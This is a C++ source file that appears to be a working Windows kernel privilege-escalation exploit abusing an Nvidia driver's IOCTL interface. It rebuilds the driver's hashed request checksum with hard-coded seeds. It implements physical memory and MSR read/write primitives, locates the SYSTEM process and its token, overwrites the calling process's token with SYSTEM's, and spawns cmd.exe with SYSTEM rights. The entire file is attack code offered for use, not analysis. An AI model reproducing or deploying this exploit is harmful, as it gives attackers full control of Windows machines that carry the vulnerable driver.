#include "Nvidia.h"
#include <Psapi.h>
#include <iomanip>
#include <format>
#include <sstream>
#include <ostream>

// https://www.vulndev.io/2022/09/24/windows-kernel-exploitation-arbitrary-memory-mapping-x64/
// The easy method to get SYSTEMs EPROC address using ntdll!NtQuerySystemInformation

#define SystemHandleInformation 0x10
#define SystemHandleInformationSize 1024 * 1024 * 2

using fNtQuerySystemInformation = NTSTATUS(WINAPI*)(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
	USHORT UniqueProcessId;
	USHORT CreatorBackTraceIndex;
	UCHAR ObjectTypeIndex;
	UCHAR HandleAttributes;
	USHORT HandleValue;
	PVOID Object;
	ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION {
	ULONG NumberOfHandles;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef NTSTATUS(NTAPI* _NtQueryIntervalProfile)(
	DWORD ProfileSource,
	PULONG Interval
	);

// VulnDev info

using namespace Nvidia;


NVR0::NVR0() {

	m_DriverHandle = ::CreateFile(L"\\\\.\\NVR0Internal", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);

	if (m_DriverHandle == INVALID_HANDLE_VALUE) {
		m_LastError = "Failed to get handle to device!";
	}

	std::ostringstream ss;
	ss << "0x" << std::hex << m_DriverHandle;

	log(Info, "Handle to driver: " + ss.str());
	// Create local heap object
	m_hBuff = HeapCreate(HEAP_NO_SERIALIZE, 0x8, 0);
}

NVR0::~NVR0() {

	::CloseHandle(m_DriverHandle);
}

vector<BYTE> NVR0::BuildBuffer(CmdBuff data) {
	/*
		1. Build initial CmdBuff and cast to vector
		3. Hash vector [0: 0x38] and save first hash
		4. Build second vector containing (Hash + Seed) and hash again
		5. Build last vector containing (2nd Hash + 2nd Seed) and hash again
		6. Build final vector and append last hash at fixed offset (0x38)
	* 
	*/
	vector<BYTE> first_hash  = { 0x0 };
	vector<BYTE> second_hash = { 0x0 };
	vector<BYTE> final_hash  = { 0x0 };
	vector<BYTE> final_output = { 0x0 };
	vector<BYTE> seed_1 = { 0x44, 0x66, 0x61, 0x73, 0x64, 0x30, 0x39, 0x38, 0x31, 0x3d, 0x6b, 0x46, 0x47, 0x64, 0x76, 0x27, 0x64, 0x66, 0x2c, 0x62, 0x3b, 0x6c, 0x73, 0x6b, 0x0 };	// Dfasd0981=kFGdv'df,b;lsk
	vector<BYTE> seed_2 = { 0x6b,0x61,0x73,0x6a,0x68,0x66,0x39,0x32,0x33,0x75,0x61,0x73,0x64,0x66,0x6b,0x59,0x59,0x45,0x2d,0x3d,0x7e, 0x0 };										// kasjhf923uasdfkYYE-=~
	
	// Convert CmdBuff to vector so we can hash it
	auto const ptr = reinterpret_cast<char*>(&data);
	vector<BYTE> init(ptr, ptr + sizeof data);

	// First round hashing: (just inputBuffer)
	first_hash = HashBuffer(init);
	first_hash.insert(first_hash.end(), seed_1.begin(), seed_1.end());
	PadBuff(first_hash, 0x80);
	
	// Second round hashing (Hash+Seed)
	second_hash = HashBuffer(first_hash);
	second_hash.insert(second_hash.end(), seed_2.begin(), seed_2.end());
	PadBuff(second_hash, 0x80);
	
	// Final round hashing (2nd Hash + 2nd Seed)
	final_hash = HashBuffer(second_hash);
	
	// Final Output
	final_output.insert(final_output.begin(), init.begin(), init.end());
	final_output.insert(final_output.begin() + 0x38, final_hash.begin(), final_hash.end());

	return final_output;
}

void NVR0::PadBuff(vector<BYTE>& buffer, DWORD size) {

	if (buffer.size() < size) {
		while(true) {
			buffer.push_back(0x0);
			if (buffer.size() == size)
				break;
		} 
	}
}

vector<BYTE> NVR0::HashBuffer(vector<BYTE> inputBuffer) {
	
	/*
		Final Buffer contains 3 rounds of hashing
		- 1st: Hash original buffer and stores hash value in new buffer
		- 2nd: Appends 12 byte seed to new buffer and hashes again (FirstHash+Seed)
		- 3rd: Takes 2nd hash and appends a new seed and hashes again (SecondHash + NewSeed)
		- 4th: Final buffer should contain the hashed value from the third round stored at offset (0x38) in the original buffer
	*/
	// Generate whirlpool hash/checksum and store at offset (0x38)
	using namespace digestpp;
	
	whirlpool wp;
	BYTE output_hash[64];
	wp.absorb(inputBuffer.data(), inputBuffer.size());
	wp.digest(output_hash, 64);
	vector<BYTE> output(output_hash, output_hash + (sizeof(output_hash) / sizeof(output_hash[0])));	

	return output;

}

map<string, LPVOID> NVR0::GetDriverBases() {
	// Get number of drivers
	DWORD lpcbNeeded;
	EnumDeviceDrivers(NULL, 0, &lpcbNeeded);

	// Calculate drivers needed 
	DWORD TotalModules = lpcbNeeded / sizeof(LPVOID);
	vector<LPVOID> ImageBases;
	ImageBases.assign(TotalModules, 0x0);

	// Get ImageBase for all drivers
	EnumDeviceDrivers(ImageBases.data(), lpcbNeeded, &lpcbNeeded);

	// Store results in map
	map<std::string, LPVOID> results;

	for (const auto& base : ImageBases) {
		std::string lpFileName = "";
		lpFileName.assign(260, 0x0);
		GetDeviceDriverBaseNameA(base, (LPSTR)lpFileName.c_str(), 260);
		results.insert({ lpFileName, base });
	}

	return results;
}

DrvInfo NVR0::FindKernelBase() {
	map<string, LPVOID> drv_bases = GetDriverBases();
	map<string, LPVOID>::iterator it = drv_bases.begin();
	DrvInfo kernel_base;

	while (it != drv_bases.end()) {

		std::string lpFileName = it->first;

		if (lpFileName.find("ntoskrnl") != string::npos) {
			printf("Ntsokrnl kernel addr\t\t: 0x%p\n", it->second);
			kernel_base.FileName = it->first;
			kernel_base.BaseAddr = it->second;
		}
		// Increment iterator
		it++;
	}

	return kernel_base;

}

ULONG_PTR NVR0::GetPsInitialSystemProcess(DrvInfo krnl) {
	HMODULE hKrn = LoadLibraryA(krnl.FileName.c_str());
	if (hKrn == 0) {
		log(Failure, "Failed to load ntsokrnl!");
		return 0x0;
	}
	FARPROC ps_init_addr = GetProcAddress(hKrn, "PsInitialSystemProcess");

	// Calculate offset by subtracting export from base
	printf("Exported PsInitialSystemProcess : 0x%p\n", ps_init_addr);
	printf("Ntsokrnl user addr\t\t: 0x%p\n", hKrn);

	ULONG_PTR dwPsInitialSystemProcessOffset = ((ULONG_PTR)ps_init_addr - (ULONG_PTR)hKrn);
	printf("PsInitialSystemProcess offset\t: 0x%p\n", dwPsInitialSystemProcessOffset);

	// Krnl.BaseAddr was calculated from (GetDeviceDriverBaseNameA); This will be the kerneladdr to PsInitialSystemProcess symbol
	ULONG_PTR ptr_ep_system = (ULONG_PTR)krnl.BaseAddr + dwPsInitialSystemProcessOffset;
	printf("\nPsInitialSystemProcess = 0x%p\n", ptr_ep_system);

	m_hBuff = HeapCreate(HEAP_NO_SERIALIZE, 0x8, 0);
	LPVOID ep_system = HeapAlloc(m_hBuff, HEAP_ZERO_MEMORY, 0x8);

	return ptr_ep_system;
}

ULONG_PTR NVR0::GetPhysicalAddress(ULONG_PTR addr) {


	DWORD bytesRet;
	vector<unsigned long long> outputBuffer = { 0x0 };
	outputBuffer.assign(0x138, 0x0);	

	CmdBuff buff = {
		.CMD = GetPhysicalAddr,	// Less than 0x80
		.Size = 0x8,
		.SourceAddress = 0x4141414141414141,
		.TargetVA = addr,
		.Unknown2 = 0x4343434343434343,
		.Unknown3 = 0x4444444444444444,
		.Unknown4 = 0x4545454545454545,
		.Unknown5 = 0x4646464646464646,
	};
	// Serialize buffer and append custom checksum at offset (0x38)
	vector<BYTE> inBuff = BuildBuffer(buff);
	PadBuff(inBuff, 0x138);

	::DeviceIoControl(m_DriverHandle, IOCTL_NVIDIA_DISPATCH, inBuff.data(), inBuff.size(), outputBuffer.data(), outputBuffer.size(), &bytesRet, NULL);

	ULONG_PTR PhysicalAddr = outputBuffer[1];

	return PhysicalAddr;

}

void NVR0::ReadPhysicalMemory(ULONG_PTR target_va, LPVOID results, DWORD size) {

	DWORD bytesRet;
	// Setup for Read
	vector<unsigned long long> outputBuffer = { 0x0 };
	outputBuffer.assign(0x138, 0x0);

	// Translate VA to PA
	ULONG_PTR PA = GetPhysicalAddress(target_va);

	CmdBuff buff = {
		.CMD = ReadPhysicalMem,							  // MmMapIO_read? Less than 0x80
		.Size = 0x0008,									      // Used for MmMapIO
		.SourceAddress = (ULONG_PTR)results,  // DstAddr
		.TargetVA = PA,									      // MmGetPhysical Target : MmapIoRead Target
		.Unknown2 = 0x4343434343434343,
		.Unknown3 = 0x4444444444444444,
		.Unknown4 = 0x4545454545454545,
		.Unknown5 = 0x4646464646464646,
	};
	// Serialize buffer and append custom checksum at offset (0x38)
	vector<BYTE> inBuff = BuildBuffer(buff);
	PadBuff(inBuff, 0x138);

	::DeviceIoControl(m_DriverHandle, IOCTL_NVIDIA_DISPATCH, inBuff.data(), inBuff.size(), outputBuffer.data(), outputBuffer.size(), &bytesRet, NULL);

}

void NVR0::WritePhysicalMemory(ULONG_PTR target_va, LPVOID results, DWORD size) {
	DWORD bytesRet;
	vector<unsigned long long> outputBuffer = { 0x0 };
	outputBuffer.assign(0x138, 0x0);

	// Translate VA to PA
	ULONG_PTR PA = GetPhysicalAddress(target_va);

	CmdBuff buff = {
		.CMD = WritePhysicalMem,								// MmapIo Write
		.Size = 0x0008,								          // Size to Read
		.SourceAddress = PA,						        // DstAddr
		.TargetVA = (ULONG_PTR)results,				  // MmGetPhysical Target : MmapIoRead Target
		.Unknown2 = 0x4343434343434343,
		.Unknown3 = 0x4444444444444444,
		.Unknown4 = 0x4545454545454545,
		.Unknown5 = 0x4646464646464646,
	};
	// Serialize buffer and append custom checksum at offset (0x38)
	vector<BYTE> inBuff = BuildBuffer(buff);
	PadBuff(inBuff, 0x138);

	::DeviceIoControl(m_DriverHandle, IOCTL_NVIDIA_DISPATCH, inBuff.data(), inBuff.size(), outputBuffer.data(), outputBuffer.size(), &bytesRet, NULL);
}

ULONG_PTR NVR0::ReadMSR(ULONG_PTR target_msr) {
	/*
		Model Specific Register Read Primitive
		- reads contents of ECX into EDX:EAX registers
	*/

	DWORD bytesRet;
	vector<unsigned long long> outputBuffer = { 0x0 };
	outputBuffer.assign(0x138, 0x0);

	CmdBuff buff = {
		.CMD = ReadMsr,								
		.Size = 0x0000,								
		.SourceAddress = target_msr,				
		.TargetVA = 0x4141414141414141,				
		.Unknown2 = 0x4343434343434343,
		.Unknown3 = 0x4444444444444444,
		.Unknown4 = 0x4545454545454545,
		.Unknown5 = 0x4646464646464646,
	};
	// Serialize buffer and append custom checksum at offset (0x38)
	vector<BYTE> inBuff = BuildBuffer(buff);
	PadBuff(inBuff, 0x138);

	::DeviceIoControl(m_DriverHandle, IOCTL_NVIDIA_DISPATCH, inBuff.data(), inBuff.size(), outputBuffer.data(), outputBuffer.size(), &bytesRet, NULL);

	// outputBuffer[3] == LIDWORD
	// outputBuffer[4] == HIDWORD
	ULONG_PTR MSR_VAL = outputBuffer[4] + outputBuffer[3];
	printf("MSR reg [0x%lx] value: 0x%llx\n", outputBuffer[1], MSR_VAL);

}

void NVR0::WriteMSR(ULONG_PTR target_msr, ULONG_PTR new_value) {
	/*
		Model Specific Register Write Primitive
		- writes contents of the EDX:EAX registers into 64-bit MSR specified in ECX
		- figure out method to split new value between (Unknown 3 : Unknown 2) low-order bytes
	*/

	DWORD bytesRet;
	vector<unsigned long long> outputBuffer = { 0x0 };
	outputBuffer.assign(0x138, 0x0);

	CmdBuff buff = {
		.CMD = WriteMsr,
		.Size = 0x0000,
		.SourceAddress = target_msr,
		.TargetVA = 0x4141414141414141,		 
		.Unknown2 = 0x0000000043434343,		// 0x18 - 0x20	// LODWORD of MSR (EAX)
		.Unknown3 = 0x0000000044444444,		// 0x20 - 0x24	// HIDWORD of MSR (EDX)
		.Unknown4 = 0x4545454545454545,		// 0x24 - 0x2c
		.Unknown5 = 0x4646464646464646,		// 0x2c - 0x34
	};
	// Serialize buffer and append custom checksum at offset (0x38)
	vector<BYTE> inBuff = BuildBuffer(buff);
	PadBuff(inBuff, 0x138);

	::DeviceIoControl(m_DriverHandle, IOCTL_NVIDIA_DISPATCH, inBuff.data(), inBuff.size(), outputBuffer.data(), outputBuffer.size(), &bytesRet, NULL);

}

ULONG_PTR NVR0::MapKernelMem(ULONG_PTR addr) {

	DWORD bytesRet;
	vector<unsigned long long> outputBuffer = { 0x0 };
	outputBuffer.assign(0x138, 0x0);

	// Allocate some mem to store results
	LPVOID addr_ptr = HeapAlloc(m_hBuff, HEAP_ZERO_MEMORY, 0x1000);
	memcpy(addr_ptr, &addr, 0x8);

	printf("Inside Heap: 0x%llx\n", addr_ptr);

	CmdBuff buff = {
		.CMD = MapKernel2User,
		.Size = 0x1000,
		.SourceAddress = 0x4141414141414141,
		.TargetVA = addr,					// PhysicalAddress to map
		.Unknown2 = 0x4343434343434343,		// 0x18 - 0x20	// LODWORD of MSR
		.Unknown3 = 0x4444444444444444,		// 0x20 - 0x24	// HIDWORD of MSR
		.Unknown4 = 0x4545454545454545,		// 0x24 - 0x2c
		.Unknown5 = 0x4646464646464646,		// 0x2c - 0x34
	};
	// Serialize buffer and append custom checksum at offset (0x38)
	vector<BYTE> inBuff = BuildBuffer(buff);
	PadBuff(inBuff, 0x138);

	::DeviceIoControl(m_DriverHandle, IOCTL_NVIDIA_DISPATCH, inBuff.data(), inBuff.size(), outputBuffer.data(), outputBuffer.size(), &bytesRet, NULL);
	
	// Dump outputBuffer
	for (const auto& x : outputBuffer) {
		printf("0x%llx\t", x);
	}

}

void NVR0::GetSystemEproc(ULONG_PTR ptr_ep_system) {
	/*
		Query kernel to get SYSTEM _EPROCESS structure
		ptr_ep_system: Kernel Address to PsInitialSystemProcess
	*/
	LPVOID ep_system = HeapAlloc(m_hBuff, HEAP_ZERO_MEMORY, 0x8);

	ReadPhysicalMemory(ptr_ep_system, ep_system, 0x8);

	unsigned long long system_eproc;
	memcpy(&system_eproc, ep_system, 0x8);
	printf("System _EPROC\t\t: 0x%llx\n", system_eproc);

	m_SystemEPROC = system_eproc;


}

void NVR0::GetSystemEprocM2() {
	/*
		This technique was from VulnDev's blog
	*/

	NTSTATUS status;
	ULONG returnLength = 0;
	ULONG64 kThread;
	PSYSTEM_HANDLE_INFORMATION handleTableInfo;

	// Load NT function
	fNtQuerySystemInformation NtQuerySystemInformation = (fNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"ntdll"), "NtQuerySystemInformation");
	
	// Allocate memory to store results for handle information
	handleTableInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SystemHandleInformationSize);
	
	// Query the system for all the System Handle Table information
	status = NtQuerySystemInformation(SystemHandleInformation, handleTableInfo, SystemHandleInformationSize, &returnLength);
	
	// Save the TableEntry information
	SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)handleTableInfo->Handles[0];
	
	// Save results
	m_SystemEPROC = (ULONG_PTR)handleInfo.Object;
	printf("SYSTEM EPROC (NtQuerySystemInformation): 0x%llx\n", m_SystemEPROC);

}

void NVR0::FindSystemToken() {
	LPVOID system_token_buff = HeapAlloc(m_hBuff, HEAP_ZERO_MEMORY, 0x8);
	unsigned long long _eproc = m_SystemEPROC + m_TokenOffset;	// Add offset to get SYSTEM TOKEN

	ReadPhysicalMemory(_eproc, system_token_buff, 0x8);

	/* Remove reference count and get actual token value.
		- https://idafchev.github.io/research/2023/06/30/Vulnerable_Driver_Part2.html#3_token_stealing_example
		The function begins by obtaining the address of the SYSTEM token.
		Then, it performs a bitwise AND operation on the token address with the value NOT 15 (equivalent to 0xFFFFFFFFFFFFFFF0).
		This operation effectively zeroes out the four least significant bits, which represent the reference count of the token.
		By zeroing out these bits, we obtain the actual token address we need.
	*/
	unsigned long long system_token_addr;
	memcpy(&system_token_addr, system_token_buff, 0x8);
	// Bitwise AND operation to remove reference count
	printf("System Token\t\t: 0x%llx\n", system_token_addr & 0xFFFFFFFFFFFFFFF0);
	m_SystemToken = system_token_addr;
}

DWORD NVR0::GetUniqueProcessID(ULONG_PTR eprocess) {
	/*
	*	Read EPROC structure to get value
	*/

	ULONG_PTR pUniqueProcessId = 0;
	unsigned long long UniqueProcessId = 0;

	pUniqueProcessId = eprocess + m_PidOffset;

	if (m_SystemEPROC == 0) {
		return -1;
	}
	LPVOID store_pid = HeapAlloc(m_hBuff, HEAP_ZERO_MEMORY, 0x8);
	ReadPhysicalMemory(pUniqueProcessId, &store_pid, 0x8);

	UniqueProcessId = (DWORD)store_pid;
	return UniqueProcessId;
}

ULONG_PTR NVR0::GetEprocessByPid(DWORD Pid) {
	/*
	* Iterate over the ActiveProcessLinks list to identify our _EPROCESS
	* structure for our current pid.
	*/

	DWORD CurrentPid = 0;
	ULONG_PTR CurrentEprocess = 0;
	ULONG_PTR Flink = 0;
	LPVOID pFlink = HeapAlloc(m_hBuff, HEAP_ZERO_MEMORY, 0x8);

	// start traversing from the System process
	CurrentEprocess = m_SystemEPROC;
	CurrentPid = GetUniqueProcessID(m_SystemEPROC);

	while (CurrentPid != Pid) {
		/*
			When parsing through the ActiveProcessLinks Flink should be 0xffffc50d7cb204c8 + 0x8
		*/
		// read the address for the next EPROCESS in the list
		CurrentEprocess = CurrentEprocess + m_APLOffset;
		ReadPhysicalMemory(CurrentEprocess, pFlink, 0x8);
		memcpy(&Flink, pFlink, 0x8);

		// the address points to the Flink field, so we need to substract the offset of ActiveProcessLinks to get the base address of the EPROCESS structure
		CurrentEprocess = Flink - m_APLOffset;
		CurrentPid = GetUniqueProcessID(CurrentEprocess);
		memset(pFlink, 0x0, 0x8);
	}

	return CurrentEprocess;
}

void NVR0::FindOurToken() {
	/*

		Parse the SYSTEM _EPROCESS ActiveLinks structure looking for our UniqueProcessId

	*/

	ULONG_PTR pOurEproc = 0;
	unsigned long long OurToken;
	LPVOID token_buff = HeapAlloc(m_hBuff, HEAP_ZERO_MEMORY, 0x8);

	// Find our _EPROCESS struct in kernel memory
	pOurEproc = GetEprocessByPid(GetCurrentProcessId());
	m_CurrentEPROC = pOurEproc;

	// Get Token
	printf("CurrentPid\t\t: 0x%x\nOur Process _EPROC\t: 0x%llx\n", GetCurrentProcessId(), pOurEproc);
	pOurEproc = pOurEproc + m_TokenOffset;
	ReadPhysicalMemory(pOurEproc, token_buff, 0x8);

	memcpy(&OurToken, token_buff, 0x8);

	// Save current token
	m_TokenRefCount = OurToken & 15;
	printf("Current Token\t\t: 0x%llx\n", OurToken & 0xFFFFFFFFFFFFFFF0);
	m_CurrentToken = OurToken;
}

void NVR0::UpdateOurToken() {

	/*
		Use the MMAP Write Primitve to update our token in kernel memory
	*/
	ULONG_PTR checkToken;
	LPVOID new_token_buff = HeapAlloc(m_hBuff, HEAP_ZERO_MEMORY, 0x8);

	// Step one: Write SYSTEM token addr to our token addr 
	memcpy(new_token_buff, &m_SystemToken, 0x8);
	printf("SystemToken stored in : 0x%llx\n", &new_token_buff);

	// Update kernel memory with new token
	printf("Replacing our Token w/ SYSTEMs:\n  0x%llx -> 0x%llx\n", m_CurrentToken, m_SystemToken);

	// Calculate Addr we are going to overwrite
	auto req = m_CurrentEPROC + m_TokenOffset;
	WritePhysicalMemory(req, (LPVOID)new_token_buff, 0x8);

	// Step two: Validate memory was updated
	LPVOID validate_buff = HeapAlloc(m_hBuff, HEAP_ZERO_MEMORY, 0x8);

	ReadPhysicalMemory(req, validate_buff, 0x8);
	memcpy(&checkToken, validate_buff, 0x8);

	if (checkToken == m_SystemToken) {
		log(Success, "Updated token successfully! ");
		printf("\nActive Token\t\t: 0x%llx\n\n", checkToken);
	}

}

void NVR0::LeakKThread(HANDLE ThreadHandle) {
	NTSTATUS status;
	ULONG returnLength = 0;
	ULONG64 kThread;
	PSYSTEM_HANDLE_INFORMATION handleTableInfo;

	// Load NT function
	fNtQuerySystemInformation NtQuerySystemInformation = (fNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"ntdll"), "NtQuerySystemInformation");

	// Allocate memory to store results for handle information
	handleTableInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SystemHandleInformationSize);

	// Query the system for all the System Handle Table information
	status = NtQuerySystemInformation(SystemHandleInformation, handleTableInfo, SystemHandleInformationSize, &returnLength);

	// Save the TableEntry information
	SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)handleTableInfo->Handles[0];

	// Save results
	m_SystemEPROC = (ULONG_PTR)handleInfo.Object;
	printf("SYSTEM EPROC (NtQuerySystemInformation): 0x%llx\n", m_SystemEPROC);

}

void NVR0::ElevateM1() {
	/*
	EoP Method 1:
	  - MmGetPhysicalAddr
	  - MmMapIO Read/Write
	*/

	// Step one: KernelBase
	DrvInfo krnl = FindKernelBase();

	// Step two: Calculate offset to PsInitialSystemProcess
	ULONG_PTR ptr_ep_system = GetPsInitialSystemProcess(krnl);

	// Step three: Query Kernel mem for PsInitialSystemProcess->SYSTEM _EPROC Addr
	GetSystemEproc(ptr_ep_system);

	// Step four:  Query Kernel to read System _EPROC  Parse SYSTEM _EPROCESS struct to find Token
	FindSystemToken();

	// Step five: Parse ActiveProcessLinks to find our current Token
	FindOurToken();

	// Step six: Update our Token w/ SYSTEM, validate our new token points to same memory as SYSTEMs
	UpdateOurToken();

	// Finale: Launch something with SYSTEM privs (cmd.exe or shellcode)
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	RtlZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	const char program[] = "cmd.exe";
	::CreateProcessA(NULL, (LPSTR)program, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	// Clean
	HeapDestroy(m_hBuff);
}

